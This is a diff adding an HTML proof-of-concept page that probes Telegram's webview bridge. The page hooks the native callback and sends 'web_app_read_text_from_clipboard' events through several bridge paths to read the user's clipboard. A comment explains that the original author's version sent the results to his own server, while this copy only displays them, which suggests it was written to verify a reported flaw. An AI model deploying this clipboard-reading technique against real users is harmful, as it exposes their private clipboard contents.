@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Probe</title></head>
+<body style="font-family:monospace">
+<h3>probe running...</h3>
+<p style="font-size:16px">
+  <a href="ivmain.html?rid=ivm1" style="font-size:20px;font-weight:bold">STEP 2: OPEN IFRAME TEST &gt;</a>
+</p>
+<pre id="out" style="font-size:11px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+  var params = new URLSearchParams(location.search);
+  var rid = params.get('rid') || '0';
+
+  // Отличие от страницы автора ровно одно: он отправлял каждую строку на свой
+  // сервер картинкой и fetch'ем, здесь всё остаётся на экране. Проверять
+  // чужой репорт, пересылая свой буфер на чужой сервер, незачем.
+  function report(obj) {
+    obj.rid = rid;
+    obj.href = location.href;
+    obj.t = Date.now();
+    var el = document.getElementById('out');
+    if (el) el.textContent += JSON.stringify(obj) + '\n';
+  }
+
+  // ---- bridge inventory ----
+  var inv = {phase: 'inventory'};
+  try { inv.proxyTypeof = typeof TelegramWebviewProxy; } catch(e) { inv.proxyTypeof = 'ERR:' + e; }
+  try { inv.protoTypeof = typeof TelegramWebviewProxyProto; } catch(e) { inv.protoTypeof = 'ERR:' + e; }
+  try { inv.protoHasPostEvent = typeof TelegramWebviewProxyProto.prototype.postEvent; } catch(e) { inv.protoHasPostEvent = 'ERR:' + e; }
+  try { inv.hasTelegram = typeof window.Telegram !== 'undefined'; } catch(e) {}
+  try {
+    if (window.Telegram && window.Telegram.WebApp) {
+      var wa = window.Telegram.WebApp;
+      inv.webAppRead = typeof wa.readTextFromClipboard;
+      inv.webAppVersion = wa.version;
+      inv.webAppPlatform = wa.platform;
+    }
+  } catch(e) {}
+  try { inv.handlers = Object.keys(window.webkit.messageHandlers).join(','); } catch(e) {}
+  report(inv);
+
+  // ---- hook native -> web callback BEFORE firing ----
+  if (!window.TelegramGameProxy) window.TelegramGameProxy = {};
+  var origRecv = window.TelegramGameProxy.receiveEvent;
+  var gotClipboard = false;
+  window.TelegramGameProxy.receiveEvent = function(event, data) {
+    report({phase: 'RECEIVE_EVENT', event: event, data: typeof data === 'object' ? JSON.stringify(data) : String(data)});
+    if (event === 'clipboard_text_received') gotClipboard = true;
+    if (typeof origRecv === 'function') { try { origRecv(event, data); } catch (e) {} }
+  };
+  report({phase: 'hooked', hadOrig: typeof origRecv});
+
+  // ---- fire clipboard read via the bridge ----
+  function sendClipboardRead(tag) {
+    var payload = JSON.stringify({req_id: 'poc-' + tag});
+    try {
+      if (typeof TelegramWebviewProxy !== 'undefined' && TelegramWebviewProxy.postEvent) {
+        TelegramWebviewProxy.postEvent('web_app_read_text_from_clipboard', payload);
+        report({phase: 'sent_' + tag, via: 'TelegramWebviewProxy'});
+        return true;
+      }
+    } catch (e) { report({phase: 'send_err_' + tag, via: 'instance', err: String(e)}); }
+    try {
+      TelegramWebviewProxyProto.prototype.postEvent('web_app_read_text_from_clipboard', payload);
+      report({phase: 'sent_' + tag, via: 'prototype'});
+      return true;
+    } catch (e) { report({phase: 'send_err_' + tag, via: 'prototype', err: String(e)}); }
+    try {
+      window.webkit.messageHandlers.performAction.postMessage({eventName: 'web_app_read_text_from_clipboard', eventData: payload});
+      report({phase: 'sent_' + tag, via: 'raw_handler'});
+      return true;
+    } catch (e) { report({phase: 'send_err_' + tag, via: 'raw_handler', err: String(e)}); }
+    return false;
+  }
+
+  sendClipboardRead('1');
+
+  // official high-level API as well, if present
+  try {
+    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.readTextFromClipboard) {
+      window.Telegram.WebApp.readTextFromClipboard(function(text) {
+        report({phase: 'webapp_api_clipboard', text: text});
+      });
+      report({phase: 'sent_webapp_api'});
+    }
+  } catch (e) { report({phase: 'webapp_api_err', err: String(e)}); }
+
+  // comparison: standard web clipboard
+  try {
+    navigator.clipboard.readText().then(function(t) {
+      report({phase: 'navigator_clipboard', text: t});
+    }).catch(function(e) {
+      report({phase: 'navigator_clipboard_err', err: String(e)});
+    });
+  } catch (e) {}
+
+  // retry once if nothing came back
+  setTimeout(function() {
+    if (!gotClipboard) {
+      report({phase: 'retry'});
+      sendClipboardRead('2');
+    }
+  }, 2000);
+
+  setTimeout(function() {
+    report({phase: 'final', gotClipboard: gotClipboard});
+  }, 4000);
+})();
+</script>
+</body>
+</html>
